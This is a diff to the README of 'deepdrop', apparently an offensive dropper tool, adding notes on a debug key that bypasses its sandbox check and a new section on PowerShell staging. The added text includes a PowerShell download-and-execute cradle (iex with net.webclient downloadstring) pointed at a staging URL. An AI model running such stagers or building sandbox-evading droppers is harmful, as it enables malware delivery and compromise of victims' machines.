@@ -49,4 +49,8 @@ core
 ```
 
 ### Testing
-Passing `-d\--debug` to deepdrop will give back a key that can be used to bypass the sandbox check for testing payloads
+Passing `-d\--debug` to deepdrop will give back a key that can be used to bypass the sandbox check for testing payloads. `powershell.exe -c "iex (new-object net.webclient).downloadstring('http://localhost/ece9d57d-ef30-47ed-accb-46ea3c436257')"`
+
+### Staging 
+Currently only powershell staging is implemented.
+
